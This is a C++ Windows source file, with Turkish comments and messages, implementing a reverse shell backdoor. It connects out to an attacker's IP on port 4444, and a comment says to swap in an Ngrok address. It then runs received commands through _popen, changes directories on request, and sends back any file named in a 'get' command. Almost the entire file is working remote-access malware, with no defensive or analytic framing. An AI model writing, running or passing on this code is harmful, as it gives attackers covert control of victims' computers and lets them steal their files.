#include <iostream>
#include <winsock2.h>
#include <ws2tcpip.h>  
#include <cstdio>      
#include <string>      
#include <memory>      
#include <stdexcept>   
#include <array>       
#include <direct.h>    
#include <cstring>     
#include <fstream>     
#pragma comment(lib, "ws2_32.lib")

std::string exec(const char* komut) {
    std::array<char, 128> buffer;
    std::string result;
    FILE* pipe = _popen(komut, "r");  // Windows için _popen
    if (!pipe) return "Komut çalıştırılamadı!";
    
    while (fgets(buffer.data(), buffer.size(), pipe) != nullptr) {
        result += buffer.data();
    }

    _pclose(pipe);
    return result;
}


int main() {
    WSADATA wsaData;
    WSAStartup(MAKEWORD(2, 2), &wsaData);

    SOCKET sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    sockaddr_in serverAddr;
    serverAddr.sin_family = AF_INET;
    serverAddr.sin_port = htons(4444);
    serverAddr.sin_addr.s_addr = inet_addr("192.168.255.133");//Put Your Ngrok Ip an Port 

    connect(sock, (SOCKADDR*)&serverAddr, sizeof(serverAddr));

    const char* message = "Komut Gir: ";
    send(sock, message, strlen(message), 0);

    char buffer[1024];
    while (true) {
        send(sock, message, strlen(message), 0);

        int bytesReceived = recv(sock, buffer, sizeof(buffer) - 1, 0);
        if (bytesReceived > 0) {
            buffer[bytesReceived] = '\0';

            std::cout << buffer;

            char firstChar = buffer[0];
            std::cout << "First character: " << firstChar << std::endl;
            char secondChar = buffer[1];
            std::cout << "Second character: " << secondChar << std::endl;
            char thirdChar = buffer[2];
            std::cout << "Third character: " << thirdChar << std::endl;
            char* afterChar = buffer + 3;

            if (firstChar == 'c' && secondChar == 'd') {
                clean_path(afterChar);
                if (afterChar[0] == ' ') {
                    afterChar = afterChar + 1;
                }
                if (chdir(afterChar) == 0) {
                    std::cout << "Klasör değiştirildi: " << afterChar << std::endl;
                } else {
                    std::cout << "Klasör değiştirilemedi: " << afterChar << std::endl;
                    std::perror("chdir() başarısız oldu");
                }
            } 
            else if (firstChar == 'g' && secondChar == 'e' && thirdChar == 't') {
                clean_path(afterChar);
                if (afterChar[0] == ' ') {
                    afterChar = afterChar + 1;
                }
                std::string dosya_adi = afterChar;
                std::cout << "Dosya adi: " << dosya_adi << std::endl;
                std::ifstream file(dosya_adi, std::ios::binary);

                if (file.is_open()) {
                    char dosya[1024];
                    while (!file.eof()) {
                        file.read(dosya, sizeof(dosya));
                        int bitboyutu = file.gcount();
                        if (bitboyutu > 0) {
                            send(sock, dosya, bitboyutu, 0);
                        }
                    }
                    file.close();
                    std::cout << "Dosya gönderildi: " << dosya_adi << std::endl;
                } else {
                    std::cout << "Dosya açılamadı: " << dosya_adi << std::endl;
                }
            }
            else if (strcmp(buffer, "exit") == 0) {
                closesocket(sock);
                WSACleanup();
                return 0;
            }
            else {
                std::string cikti = exec(buffer);
                send(sock, cikti.c_str(), cikti.length(), 0);
            }
        }
    }
}
